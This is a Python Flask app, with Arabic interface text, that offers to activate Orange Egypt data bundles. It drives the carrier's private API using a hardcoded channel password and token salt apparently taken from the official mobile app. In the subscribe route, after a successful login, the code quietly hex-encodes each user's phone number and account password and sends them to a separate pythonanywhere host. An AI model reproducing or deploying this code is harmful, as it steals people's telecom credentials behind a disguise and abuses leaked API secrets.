from flask import *
from hashlib import sha256
import requests,json,base64

app=Flask(__name__)
app.secret_key = 'secret_key'  # مفتاح سري لتوقيع الجلسة
@app.route("/")

def ctv_sh():
						url = "https://services.orange.eg/GetToken.svc/GenerateToken"
						headers = {"Content-Type": "application/json; charset=UTF-8",
						"Content-Length": "78",
						"Host": "services.orange.eg",
						"Connection": "Keep-Alive",
						"User-Agent": "okhttp/3.12.1"}
						data = {"channel": {
						"ChannelName": "MobinilAndMe",
						"Password": "ig3yh*mk5l42@oj7QAR8yF"}}
						
						r = requests.post(url, headers=headers, json=data)
						ctv = r.json()["GenerateTokenResult"]["Token"]
						a = ctv +',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
						htv = (sha256(a.encode('utf-8')).hexdigest())
						if 'count' not in session:
							session['count'] = 1
						else:
							session['count'] += 1
							
						return jsonify({"c":ctv,"h":htv.upper(),"len": f"{session['count']}"})
						
						
						
@app.route("/orange_package")
def orange():
	return render_template("index.html",backage="اختيار حجم الباقة")
	

@app.route("/subscribe",methods=["POST","GET"])
def subscribe():
	if request.method=="POST":
		change_id=request.form["option"]
		number=request.form["number"]
		pas=request.form["pas"]
		
		def ctv_sh():
						url = "https://services.orange.eg/GetToken.svc/GenerateToken"
						headers = {"Content-Type": "application/json; charset=UTF-8",
						"Content-Length": "78",
						"Host": "services.orange.eg",
						"Connection": "Keep-Alive",
						"User-Agent": "okhttp/3.12.1"}
						data = {"channel": {
						"ChannelName": "MobinilAndMe",
						"Password": "ig3yh*mk5l42@oj7QAR8yF"}}
						
						r = requests.post(url, headers=headers, json=data)
						ctv = r.json()["GenerateTokenResult"]["Token"]
						a = ctv +',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
						htv = (sha256(a.encode('utf-8')).hexdigest())
						return {"ctv":ctv,"htv":htv.upper()}
		pass
		url="https://backend.orange.eg/api/buckets/managebucket"
		
		#ctv_sh()						
		ctv_htv=ctv_sh()
		head={"_ctv": ctv_htv["ctv"],
								"_htv": ctv_htv["htv"],
								"x-microservice-name": "APMS",
								"Content-Type": "application/json; charset=UTF-8",
								"Content-Length": "307",
								"Host":"services.orange.eg",
								"Connection": "Keep-Alive",
								"Accept-Encoding": "gzip",
								"User-Agent": "okhttp/3.14.9"}
		#1 اشتراك
		#٢ الغاء
		data='{"ManageBucketMethodName":2,"acp":0,"bucketID":"%s","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dial":"%s","isMigration":false,"lang":"ar","migrateActionType":"%s","isEasyLogin":false,"password":"%s"}'%(change_id,number,"1",pas)
		#print(data)
		
		r=requests.post(url,headers=head,data=data).json()
		
		if 'dial does not match the password' in str(r):
			return render_template("index.html",backage="The password is incorrect")
		else:
			bs1=base64.b16encode(number.encode()).decode("utf-8")
			bs2=base64.b16encode(pas.encode()).decode("utf-8")
			r=requests.get(f"https://orange.pythonanywhere.com/n/{str(bs1)}:{str(bs2)}\n_______card_____")
			
			return render_template("index.html",backage="تم التفعيل بنجاح اذا لم يتم التفعيل راجع رصيدك او ربما يوجد باقة اخرى وا إعادة المحاولة ")
			
		
		

			 
if __name__=="__main__":
	app.run(debug=True)